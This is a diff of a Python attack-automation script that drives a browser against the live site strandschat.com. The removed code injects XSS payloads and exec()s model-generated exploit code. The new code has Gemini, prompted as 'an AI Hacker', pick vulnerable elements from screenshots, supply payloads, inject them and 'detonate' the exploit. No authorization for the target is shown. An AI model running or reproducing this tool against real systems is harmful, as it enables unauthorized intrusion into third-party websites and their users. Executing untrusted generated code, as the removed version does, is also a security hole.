@@ -1,262 +1,213 @@
 import json
 import os
 import asyncio
-import re
+import base64
+from dotenv import load_dotenv
 from playwright.async_api import async_playwright
+from langchain_google_genai import ChatGoogleGenerativeAI
+from langchain_core.messages import HumanMessage
 
-def extract_code_from_markdown(code_block):
-    """Extract Python code from markdown code blocks and convert to async."""
-    if not code_block:
-        return None
-    
-    # Remove markdown code block markers
-    code = code_block.replace("```python", "").replace("```", "").strip()
-    
-    # If code is empty after cleaning, return None
-    if not code:
-        return None
-    
-    # Convert sync to async patterns
-    code = code.replace("sync_playwright", "async_playwright")
-    code = code.replace("with sync_playwright()", "async with async_playwright()")
-    code = code.replace("p.chromium.launch()", "await p.chromium.launch()")
-    code = code.replace("browser.new_page()", "await browser.new_page()")
-    code = code.replace("page.goto(", "await page.goto(")
-    code = code.replace("page.fill(", "await page.fill(")
-    code = code.replace("page.click(", "await page.click(")
-    code = code.replace("page.locator(", "await page.locator(")
-    code = code.replace("page.wait_for_timeout(", "await page.wait_for_timeout(")
-    code = code.replace("browser.close()", "await browser.close()")
-    
-    # Try to extract just the executable parts (inside functions, without function defs)
-    lines = code.split("\n")
-    executable_lines = []
-    in_function = False
-    indent_level = 0
-    
-    for line in lines:
-        stripped = line.strip()
-        
-        # Skip empty lines at start
-        if not executable_lines and not stripped:
-            continue
-            
-        # Skip function definitions and imports
-        if stripped.startswith("def ") or stripped.startswith("async def ") or stripped.startswith("import ") or stripped.startswith("from "):
-            in_function = True
-            continue
-            
-        # Skip if __name__ blocks
-        if "__name__" in line or "__main__" in line:
-            continue
-            
-        # Skip decorators
-        if stripped.startswith("@"):
-            continue
-            
-        # If we're collecting lines, add them
-        if stripped:
-            # Remove leading indentation for function content
-            if in_function:
-                # Try to detect and remove function-level indentation
-                indent = len(line) - len(line.lstrip())
-                if indent_level == 0:
-                    indent_level = indent
-                if indent > indent_level:
-                    line = line[indent_level:]
-            executable_lines.append(line)
-    
-    result = "\n".join(executable_lines).strip()
-    return result if result else None
+load_dotenv()
 
-async def execute_exploit_actions(page, exploit):
-    """Execute exploit actions directly on the page based on the vulnerability."""
-    target = exploit.get("target", {})
-    action = exploit.get("action", "")
-    log = exploit.get("log", "")
+# Use a Vision-Capable Model
+model = ChatGoogleGenerativeAI(
+    model="gemini-2.0-flash-exp",
+    api_key=os.getenv("GOOGLE_API_KEY"),
+    temperature=0.1
+)
+
+def encode_image(image_path):
+    """Helper to read image as base64 string"""
+    if not image_path or not os.path.exists(image_path):
+        return None
+    with open(image_path, "rb") as image_file:
+        return base64.b64encode(image_file.read()).decode("utf-8")
+
+async def get_page_context(page):
+    """Scrapes the text context (ID/Class/Text)"""
+    elements = await page.query_selector_all('button, input, textarea, [role="button"], .btn, svg')
+    context_list = []
+    for i, el in enumerate(elements):
+        try:
+            if await el.is_visible():
+                tag = await el.evaluate("e => e.tagName.toLowerCase()")
+                eid = await el.get_attribute("id") or ""
+                text = await el.inner_text()
+                context_list.append(f"Index {i}: <{tag} id='{eid}'> Text='{text[:20]}'")
+        except: pass
+    return "\n".join(context_list[:50])
+
+async def smart_visual_exploit(page, exploit_data):
+    """
+    Uses VISUAL MATCHING to find the target.
+    """
+    print("      👁️  AI comparing LIVE VIEW vs REFERENCE...")
+
+    # 1. Capture LIVE screenshot
+    live_shot_path = "current_view.png"
+    await page.screenshot(path=live_shot_path)
+    live_b64 = encode_image(live_shot_path)
     
+    # 2. Load REFERENCE screenshot (from QA Agent)
+    ref_path = exploit_data.get("ref_screenshot")
+    ref_b64 = encode_image(ref_path)
+
+    # 3. Get DOM Context
+    dom_context = await get_page_context(page)
+
+    # 4. Construct the Vision Prompt
+    message_content = [
+        {
+            "type": "text",
+            "text": f"""
+            You are an AI Hacker using Visual Recognition.
+            
+            TASK: 
+            Find the vulnerable element in the LIVE VIEW that matches the target in the REFERENCE VIEW.
+            
+            TARGET INFO:
+            - Original Tag: {exploit_data['target'].get('tagName')}
+            - Original ID: {exploit_data['target'].get('id')}
+            - Vulnerability: {exploit_data.get('reason')}
+            
+            LIVE DOM ELEMENTS:
+            {dom_context}
+            
+            INSTRUCTIONS:
+            1. Compare the 'REFERENCE' image (where we found the bug) with the 'LIVE' image.
+            2. Identify the correct element Index in the LIVE DOM list.
+            3. Suggest a payload and trigger action.
+            
+            OUTPUT JSON ONLY:
+            {{
+              "input_index": <number>,
+              "payload": "<payload string>",
+              "trigger_action": "click_element" | "press_enter", 
+              "trigger_index": <number for button>
+            }}
+            """
+        },
+        {
+            "type": "image_url",
+            "image_url": {"url": f"data:image/png;base64,{live_b64}"}
+        }
+    ]
+    
+    # Only add reference if it exists
+    if ref_b64:
+        message_content.insert(1, {
+            "type": "text",
+            "text": "REFERENCE VIEW (Target is here):"
+        })
+        message_content.insert(2, {
+            "type": "image_url",
+            "image_url": {"url": f"data:image/png;base64,{ref_b64}"}
+        })
+
+    # 5. Invoke Gemini Vision
     try:
-        if action == "fill_input":
-            # Extract payload from log if available
-            payload_match = re.search(r"with ['\"]([^'\"]+)['\"]", log)
-            if payload_match:
-                payload = payload_match.group(1)
-            else:
-                # Default XSS payloads
-                if "email" in target.get("outerHTML", "").lower():
-                    payload = "test<script>alert('XSS')</script>@example.com"
-                else:
-                    payload = "<script>alert('XSS')</script>"
-            
-            # Find and fill the target element
-            tag_name = target.get("tagName", "").lower()
-            placeholder = target.get("placeholder", "")
-            
-            if tag_name == "input":
-                if placeholder:
-                    await page.fill(f'input[placeholder="{placeholder}"]', payload)
-                else:
-                    inputs = await page.query_selector_all("input")
-                    if inputs:
-                        await inputs[0].fill(payload)
-            elif tag_name == "textarea":
-                if placeholder:
-                    await page.fill(f'textarea[placeholder="{placeholder}"]', payload)
-                else:
-                    textareas = await page.query_selector_all("textarea")
-                    if textareas:
-                        await textareas[0].fill(payload)
-            
-            print(f"    📝 Filled {tag_name} with payload")
-            
-            # Try to trigger submission
-            try:
-                submit_buttons = await page.query_selector_all('button[type="submit"], button:has-text("Sign"), button:has-text("Send")')
-                if submit_buttons:
-                    await submit_buttons[0].click()
-                    print(f"    🖱️ Clicked submit button")
-            except:
-                pass
+        msg = HumanMessage(content=message_content)
+        res = await model.ainvoke([msg])
         
-        elif action == "click_element":
-            tag_name = target.get("tagName", "").lower()
-            outer_html = target.get("outerHTML", "")
+        # Parse JSON
+        content = str(res.content).replace("```json", "").replace("```", "").strip()
+        if "{" in content: content = content[content.find("{"):content.rfind("}")+1]
+        plan = json.loads(content)
+        
+        print(f"      🎯 Visual Match: Target is Index {plan.get('input_index')}")
+        
+        # 6. Execute
+        elements = await page.query_selector_all('button, input, textarea, [role="button"], .btn, svg')
+        
+        # Fill Input
+        idx = plan.get("input_index")
+        if idx is not None and idx < len(elements):
+            await elements[idx].fill(plan['payload'])
+            print(f"      💉 Injected: {plan['payload']}")
+        
+        await page.wait_for_timeout(500)
+        
+        # Trigger
+        trig_action = plan.get("trigger_action")
+        trig_idx = plan.get("trigger_index")
+        
+        if trig_action == "press_enter":
+            await elements[idx].press("Enter")
+        elif trig_idx is not None and trig_idx < len(elements):
+            await elements[trig_idx].click()
             
-            # Try to find and click the button
-            if "Sign Up" in outer_html:
-                await page.click('button:has-text("Sign Up")')
-            elif "Get Started" in outer_html:
-                await page.click('button:has-text("Get Started")')
-            elif "Send" in outer_html or "↑" in outer_html:
-                send_buttons = await page.query_selector_all('button.send-icon-button, button:has-text("Send")')
-                if send_buttons:
-                    await send_buttons[0].click()
-            
-            print(f"    🖱️ Clicked {tag_name}")
-            
+        print("      🚀 Exploit Detonated.")
+        await page.wait_for_timeout(2000)
+
     except Exception as e:
-        print(f"    ⚠️ Error executing action: {e}")
+        print(f"      ❌ Visual Attack Failed: {e}")
+        # Fallback to text-based replay
+        await execute_step(page, exploit_data)
+
+# --- Helper to Replay Steps (Same as before) ---
+async def execute_step(page, step_data):
+    """Simple replay logic for setup steps"""
+    try:
+        action = step_data.get("action")
+        target = step_data.get("target", {})
+        if action == "fill_input":
+            # Try heuristic match
+            inputs = await page.query_selector_all(target.get('tagName', 'input'))
+            if inputs: await inputs[0].fill("replay")
+        elif action == "click_element":
+            btns = await page.query_selector_all(target.get('tagName', 'button'))
+            if btns: await btns[0].click()
+        await page.wait_for_timeout(500)
+    except: pass
 
 async def run_attacks():
-    print("🚀 INITIALIZING ATTACK SEQUENCE...")
+    print("🚀 INITIALIZING VISUAL ATTACK AGENT...")
     
-    # 1. Load the Attack Plan
     if not os.path.exists("final_exploit_plan.json"):
-        print("❌ No attack plan found. Run 'exploit_planner.py' first!")
+        print("❌ No plan found.")
         return
 
     with open("final_exploit_plan.json", "r") as f:
-        plan_data = json.load(f)
+        data = json.load(f)
+        exploits = data.get("exploits", [])
 
-    # Handle new JSON structure with "exploits" key
-    if isinstance(plan_data, dict) and "exploits" in plan_data:
-        exploits = plan_data["exploits"]
-        total = plan_data.get("total_exploits_generated", len(exploits))
-        print(f"📋 Loaded exploit plan: {total} exploits found")
-    else:
-        # Fallback for old format (direct array)
-        exploits = plan_data if isinstance(plan_data, list) else []
-        total = len(exploits)
-        print(f"📋 Loaded {total} exploits (legacy format)")
-
-    if not exploits:
-        print("❌ No exploits to execute!")
-        return
-
-    print(f"🔫 LOADED {total} PAYLOADS. LAUNCHING BROWSER...")
-
-    # Create directories
     os.makedirs("attack_evidence", exist_ok=True)
-    os.makedirs("attack_videos", exist_ok=True)
 
     async with async_playwright() as p:
-        # Launch headed so we can SEE the hack happen
         browser = await p.chromium.launch(headless=False)
-        context = await browser.new_context(record_video_dir="attack_videos/")
-        page = await context.new_page()
-
-        # Target URL - matches qa_agent_v1.py
-        target_url = "http://strandschat.com"
-        
-        try:
-            await page.goto(target_url, timeout=10000)
-            print(f"🌐 Connected to {target_url}")
-        except Exception as e:
-            print(f"❌ Could not connect to target: {e}")
-            await browser.close()
-            return
-
-        # 2. Execute Each Exploit
-        successful_attacks = 0
-        failed_attacks = 0
         
         for i, exploit in enumerate(exploits, 1):
-            element_id = exploit.get("element_id", "unknown") or exploit.get("target", {}).get("id", f"element_{i}")
-            action = exploit.get("action", "unknown")
-            reward = exploit.get("reward", 0)
+            context = await browser.new_context(record_video_dir="attack_videos/")
+            page = await context.new_page()
             
             print(f"\n{'='*60}")
-            print(f"[{i}/{total}] EXECUTING EXPLOIT #{i}")
-            print(f"    Target: {element_id}")
-            print(f"    Action: {action}")
-            print(f"    Reward: {reward}")
+            print(f"⚔️ MISSION #{i}: Exploit {exploit.get('element_id')}")
             print(f"{'='*60}")
             
+            # 1. Connect
+            target_url = "http://strandschat.com"
             try:
-                # Method 1: Try to extract and execute code from exploit_code field
-                exploit_code = exploit.get("exploit_code")
-                
-                if exploit_code and not exploit.get("error"):
-                    # Extract code from markdown if present
-                    extracted_code = extract_code_from_markdown(exploit_code)
-                    
-                    if extracted_code:
-                        try:
-                            # Try to execute the extracted code
-                            exec_code = f"""
-async def execute_payload(page, target_url):
-    target_url = "{target_url}"
-    {extracted_code}
-"""
-                            exec(exec_code, globals())
-                            await globals()['execute_payload'](page, target_url)
-                            print("    ✅ Executed exploit code")
-                        except Exception as e:
-                            print(f"    ⚠️ Code execution failed: {e}, trying direct actions...")
-                            # Fallback to Method 2
-                            await execute_exploit_actions(page, exploit)
-                    else:
-                        print("    ⚠️ Could not extract executable code, trying direct actions...")
-                        await execute_exploit_actions(page, exploit)
-                else:
-                    # Method 2: Execute based on vulnerability structure
-                    print("    🔧 Using direct action execution...")
-                    await execute_exploit_actions(page, exploit)
-                
-                # Wait to see the effect (e.g., Alert box or crash)
-                await page.wait_for_timeout(3000)
-                
-                # Take a "Trophy Shot"
-                safe_filename = element_id.replace("/", "_").replace("\\", "_")[:50]
-                screenshot_path = f"attack_evidence/exploit_{i}_{safe_filename}.png"
-                await page.screenshot(path=screenshot_path)
-                print(f"    📸 Screenshot saved: {screenshot_path}")
-                
-                successful_attacks += 1
-                print("    ✅ Payload Delivered Successfully")
-
+                await page.goto(target_url, timeout=10000)
+                print(f"  🌐 Connected to {target_url}")
             except Exception as e:
-                failed_attacks += 1
-                print(f"    ❌ Execution Failed: {e}")
-                import traceback
-                traceback.print_exc()
+                print(f"  ❌ Could not connect to {target_url}: {e}")
+                await context.close()
+                continue 
 
-        print(f"\n{'='*60}")
-        print("🏁 ATTACK SEQUENCE COMPLETE")
-        print(f"    ✅ Successful: {successful_attacks}/{total}")
-        print(f"    ❌ Failed: {failed_attacks}/{total}")
-        print(f"{'='*60}")
-        
+            # 2. Replay Setup
+            setup_steps = exploit.get("setup_steps", [])
+            if setup_steps:
+                print(f"  ⏪ Replaying {len(setup_steps)} setup steps...")
+                for step in setup_steps:
+                    await execute_step(page, step)
+            
+            # 3. VISUAL ATTACK
+            await smart_visual_exploit(page, exploit)
+
+            # 4. Evidence
+            await page.screenshot(path=f"attack_evidence/mission_{i}_result.png")
+            await context.close()
+
         await browser.close()
 
 if __name__ == "__main__":
